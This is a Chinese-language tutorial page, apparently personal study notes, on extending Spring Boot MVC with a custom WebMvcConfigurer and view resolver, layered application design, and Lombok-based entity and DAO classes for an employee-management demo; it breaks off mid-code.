#E5C07B">Spring</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">MVC</span><span style="color: #E06C75"> that works well with most applications</span><span style="color: #ABB2BF">.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 自动配置在Spring默认设置的基础上添加了以下功能：</span></span><span class="line"><span style="color: #E5C07B">The</span><span style="color: #E06C75"> auto</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">configuration adds the following features on top of Spring’s defaults</span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 包含视图解析器</span></span><span class="line"><span style="color: #E5C07B">Inclusion</span><span style="color: #E06C75"> of </span><span style="color: #E5C07B">ContentNegotiatingViewResolver</span><span style="color: #E06C75"> and </span><span style="color: #E5C07B">BeanNameViewResolver</span><span style="color: #E06C75"> beans</span><span style="color: #ABB2BF">.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 支持静态资源文件夹的路径，以及webjars</span></span><span class="line"><span style="color: #E5C07B">Support</span><span style="color: #E06C75"> </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> serving </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> resources</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> including support </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">WebJars</span><span style="color: #E06C75"> </span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 自动注册了Converter：</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 转换器，这就是我们网页提交数据到后台自动封装成为对象的东西，比如把&quot;1&quot;字符串自动转换为int类型</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// Formatter：【格式化器，比如页面给我们了一个2019-8-10，它会给我们自动格式化为Date对象】</span></span><span class="line"><span style="color: #E5C07B">Automatic</span><span style="color: #E06C75"> registration of Converter</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> GenericConverter</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> and </span><span style="color: #E5C07B">Formatter</span><span style="color: #E06C75"> beans</span><span style="color: #ABB2BF">.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// HttpMessageConverters</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// SpringMVC用来转换Http请求和响应的的，比如我们要把一个User对象转换为JSON字符串，可以去看官网文档解释；</span></span><span class="line"><span style="color: #E5C07B">Support</span><span style="color: #E06C75"> </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">HttpMessageConverters</span><span style="color: #E06C75"> (covered later in </span><span style="color: #E5C07B">this</span><span style="color: #E06C75"> document)</span><span style="color: #ABB2BF">.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 定义错误代码生成规则的</span></span><span class="line"><span style="color: #E5C07B">Automatic</span><span style="color: #E06C75"> registration of </span><span style="color: #61AFEF">MessageCodesResolver</span><span style="color: #E06C75"> (covered later in </span><span style="color: #E5C07B">this</span><span style="color: #E06C75"> document)</span><span style="color: #ABB2BF">.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 首页定制</span></span><span class="line"><span style="color: #E5C07B">Static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">index</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">html</span><span style="color: #E06C75"> support</span><span style="color: #ABB2BF">.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 图标定制</span></span><span class="line"><span style="color: #E5C07B">Custom</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Favicon</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">support</span><span style="color: #E06C75"> (covered later in </span><span style="color: #E5C07B">this</span><span style="color: #E06C75"> document)</span><span style="color: #ABB2BF">.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 初始化数据绑定器：帮我们把请求数据绑定到JavaBean中！</span></span><span class="line"><span style="color: #E5C07B">Automatic</span><span style="color: #E06C75"> use of a </span><span style="color: #E5C07B">ConfigurableWebBindingInitializer</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">bean</span><span style="color: #E06C75"> (covered later in </span><span style="color: #E5C07B">this</span><span style="color: #E06C75"> document)</span><span style="color: #ABB2BF">.</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">/*</span></span><span class="line"><span style="color: #7F848E; font-style: italic">如果您希望保留Spring Boot MVC功能，并且希望添加其他MVC配置（拦截器、格式化程序、视图控制器和其他功能），则可以添加自己</span></span><span class="line"><span style="color: #7F848E; font-style: italic">的@configuration类，类型为webmvcconfiguer，但不添加@EnableWebMvc。如果希望提供</span></span><span class="line"><span style="color: #7F848E; font-style: italic">RequestMappingHandlerMapping、RequestMappingHandlerAdapter或ExceptionHandlerExceptionResolver的自定义</span></span><span class="line"><span style="color: #7F848E; font-style: italic">实例，则可以声明WebMVCregistrationAdapter实例来提供此类组件。</span></span><span class="line"><span style="color: #7F848E; font-style: italic">*/</span></span><span class="line"><span style="color: #E5C07B">If</span><span style="color: #E06C75"> you want to keep </span><span style="color: #E5C07B">Spring</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Boot</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">MVC</span><span style="color: #E06C75"> features and you want to add additional </span><span style="color: #E5C07B">MVC</span><span style="color: #E06C75"> configuration </span></span><span class="line"><span style="color: #E06C75">(interceptors</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> formatters</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> view controllers</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> and other features)</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> you can add your own </span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Configuration</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">of</span><span style="color: #E06C75"> type WebMvcConfigurer but without @EnableWebMvc. If you wish to provide </span></span><span class="line"><span style="color: #E06C75">custom instances of RequestMappingHandlerMapping, RequestMappingHandlerAdapter, or </span></span><span class="line"><span style="color: #E06C75">ExceptionHandlerExceptionResolver, you can declare a WebMvcRegistrationsAdapter instance to provide such components.</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 如果您想完全控制Spring MVC，可以添加自己的@Configuration，并用@EnableWebMvc进行注释。</span></span><span class="line"><span style="color: #E06C75">If you want to take complete control of Spring MVC, you can add your own @Configuration annotated with @EnableWebMvc.</span></span></code></pre></div></div></figure><p>根据文档所说</p><ul><li><p>添加其他MVC配置&#x3D;&#x3D;添加自己的@Configuration  +  WebMvcRegistrationsAdapter (接口)  +  <code>无@EnableWebMvc</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251031170850196.png" alt="image-20251031170850102"></p></li><li><p>自己装配一个视图解释器</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.kuang.config</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.context.annotation.Bean</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.context.annotation.Configuration</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.web.servlet.View</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.web.servlet.ViewResolver</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.web.servlet.config.annotation.WebMvcConfigurer</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Locale</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 如果。你想diy一些定制化的功能，只要写这个组件，然后将它交给springboot，springboot就会帮我们自动装配！</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 扩展 springmvc  dispatchservlet</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Configuration</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">MyMvcConfig</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">WebMvcConfigurer</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// ViewResolver 实现了视图解析器接口的类，我们就可以把它看做视图解析器</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Bean</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ViewResolver</span><span style="color: #61AFEF"> myViewResolver</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">MyViewResolver</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// 自定义了一个自己的视图解析器MyViewResolver</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">MyViewResolver</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ViewResolver</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">View</span><span style="color: #61AFEF"> resolveViewName</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">viewName</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Locale</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">locale</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>在config创建一个自己的MyMvcConfig</p><p>继承ViewResolver到自己的类，重写方法</p><p>将方法实例化，写@Bean待用</p><p>启动即可</p></li><li><p><strong>全面接管：</strong></p><ol><li><p>SpringBoot对SpringMVC的自动配置不需要了，所有都是我们自己去配置！</p></li><li><p>只需在我们的配置类中要加一个@EnableWebMvc。（导入了一个类:DelegatingwebMvcconfiguration:从容器中获取所有的webmvcconfig）</p></li><li><p>我们看下如果我们全面接管了SpringMVC了，我们之前SpringBoot给我们配置的静态资源映射一定会无效</p></li></ol></li></ul></li></ul><h1 id="开发分层"><a href="#开发分层" class="headerlink" title="开发分层"></a>开发分层</h1><p>从下到上：</p><ol><li>数据库层（最底层，数据存储载体）</li></ol><ul><li>本质：实际存储数据的数据库（如 MySQL、Oracle、Redis 等），是所有数据操作的最终目标。</li><li>作用：接收上层指令，完成数据的物理存储、查询、修改，不包含业务逻辑。</li></ul><ol start="2"><li>DAO 层（数据访问层，核心写 &#x2F; 读数据层）</li></ol><ul><li>你已经了解的核心数据操作层，专门负责和数据库交互。</li><li>写数据相关操作：通过 <code>save()</code>（新增）、<code>update()</code>（修改）、<code>delete()</code>（删除）等方法，将业务层传递的数据写入数据库。</li><li>关键：只做数据读写，不处理业务规则（比如不能在 DAO 层判断 “用户是否有权限修改数据”）。</li></ul><ol start="3"><li>Service 层（业务逻辑层，数据操作的 “决策者”）</li></ol><ul><li>作用：承接上层请求，处理核心业务逻辑，决定 “要不要写数据”“写什么数据”。</li><li>与数据的关系：不直接操作数据库，而是调用 DAO 层的方法来完成数据写入 &#x2F; 读取。</li><li>示例：用户提交订单时，Service 层先判断库存是否充足，再调用 <code>orderDao.save(order)</code> 写入订单数据，同时调用 <code>productDao.updateStock()</code> 修改库存数据。</li></ul><ol start="4"><li>Controller 层（控制层，数据的 “接收者” 和 “返回者”）</li></ol><ul><li>作用：接收前端（如网页、APP）的请求（比如用户提交的表单数据），传递给 Service 层，再将处理结果（成功 &#x2F; 失败、返回数据）返回给前端。</li><li>与数据的关系：只负责数据的接收和转发，不处理业务，也不直接操作数据库。</li><li>示例：接收前端传来的 “新增用户” 数据（姓名、年龄），封装成 User 对象传给 <code>userService.saveUser(user)</code>，再告诉前端 “用户新增成功”。</li></ul><ol start="5"><li>前端层（视图层，用户交互层）</li></ol><ul><li>作用：用户直接操作的界面（如网页、APP 页面），负责展示数据和收集用户输入的数据。</li><li>与数据的关系：将用户输入的数据（如填写的注册信息）传递给 Controller 层，再展示从后端返回的数据（如查询到的用户列表）</li></ul><h1 id="项目开发"><a href="#项目开发" class="headerlink" title="项目开发"></a>项目开发</h1><h2 id="数据库层"><a href="#数据库层" class="headerlink" title="数据库层"></a>数据库层</h2><ol><li><p>伪造数据<code>Department</code></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.example.demo.pojo</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">lombok.AllArgsConstructor</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">lombok.Data</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">lombok.NoArgsConstructor</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">//部门表</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Data</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">AllArgsConstructor</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">NoArgsConstructor</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Department</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75">  </span><span style="color: #E5C07B">Integer</span><span style="color: #E06C75"> id</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75">  </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> departmentName</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>导入lombok—–伪造数据——-导入注解</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Data</span><span style="color: #7F848E; font-style: italic">//数据</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">AllArgsConstructor</span><span style="color: #7F848E; font-style: italic">//有参</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">NoArgsConstructor</span><span style="color: #7F848E; font-style: italic">//无参</span></span></code></pre></div></div></figure><p>（Lombok 是一个 Java 库，通过注解简化 Java 代码开发，减少模板代码（如 getter、setter、构造器等），提高开发效率）</p><p><strong>Lombok用途：</strong></p><ul><li><strong>消除模板代码</strong><ul><li><code>@Getter</code>&#x2F;<code>@Setter</code>：自动生成字段的 getter&#x2F;setter 方法。</li><li><code>@ToString</code>：生成 <code>toString()</code> 方法，可通过 <code>exclude</code> 排除字段。</li><li><code>@EqualsAndHashCode</code>：生成 <code>equals()</code> 和 <code>hashCode()</code> 方法。</li><li><code>@NoArgsConstructor</code>&#x2F;<code>@AllArgsConstructor</code>&#x2F;<code>@RequiredArgsConstructor</code>：生成无参、全参、必填字段（<code>final</code> 或 <code>@NonNull</code>）的构造器。</li></ul></li><li><strong>简化对象创建</strong><ul><li><code>@Builder</code>：提供建造者模式 API，方便链式调用创建对象（如 <code>User.builder().name(&quot;a&quot;).age(18).build()</code>）。</li></ul></li><li><strong>资源自动管理</strong><ul><li><code>@Cleanup</code>：自动关闭实现 <code>Closeable</code> 的资源（如 IO 流），替代 <code>try-finally</code>。</li></ul></li><li><strong>日志简化</strong><ul><li><code>@Slf4j</code>（或 <code>@Log</code>&#x2F;<code>@Log4j</code> 等）：自动生成日志对象（如 <code>private static final Logger log = LoggerFactory.getLogger(xxx.class)</code>），直接使用 <code>log.info(...)</code>。</li></ul></li><li><strong>数据类简化</strong><ul><li><code>@Data</code>：组合 <code>@Getter</code>、<code>@Setter</code>、<code>@ToString</code>、<code>@EqualsAndHashCode</code>、<code>@RequiredArgsConstructor</code>，适合简单数据类。</li><li><code>@Value</code>：生成不可变类（字段默认为 <code>final</code>，仅含 getter）</li></ul></li></ul></li><li><p>写员工表<code>Employee</code></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.example.demo.pojo</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">lombok.AllArgsConstructor</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">lombok.Data</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">lombok.NoArgsConstructor</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Data</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">AllArgsConstructor</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">NoArgsConstructor</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//员工表</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Employee</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #E06C75"> id</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> Lastname</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> Email</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #E06C75"> gender</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//0: 女  1：男</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Department</span><span style="color: #E06C75"> department</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Data</span><span style="color: #E06C75"> birthday</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>其中调用 <code>@NoArgsConstructor + @AllArgsConstructor</code>，框架可通过无参构造器创建对象，手动创建时可直接 <code>new User(&quot;张三&quot;,20)</code>，兼顾灵活性和便捷性</p></li></ol><p>后面在写DAO层的时候，发现date不会自动实现，所以手动构造一下有参构造器</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Employee</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Integer</span><span style="color: #E06C75"> id</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> lastname</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> email</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #E06C75"> gender</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">Department</span><span style="color: #E06C75"> department) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">id</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> id</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        Lastname </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> lastname</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        Email </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> email</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">department</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> department</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">gender</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> gender</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">//默认创建日期</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">birthday</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Date</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>记得加上date的类</p><h2 id="DAO-层"><a href="#DAO-层" class="headerlink" title="DAO 层"></a>DAO 层</h2><ul><li><p>写<code>DepartmentDao</code>和<code>EmployeeDao</code></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.example.demo.dao</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.example.demo.pojo.Department</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.stereotype.Repository</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Collection</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.HashMap</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Map</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">//部门Dao</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Repository</span><span style="color: #7F848E; font-style: italic">//使用spring托管</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">DepartmentDao</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//模拟数据库中的数据</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #C678DD">private</span><span style="color: #E06C75">  </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Department</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> departments </span><span style="color: #56B6C2">=</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">       departments</span><span style="color: #56B6C2">=</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Department</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//创建一个部门表</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">departments</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">101</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: 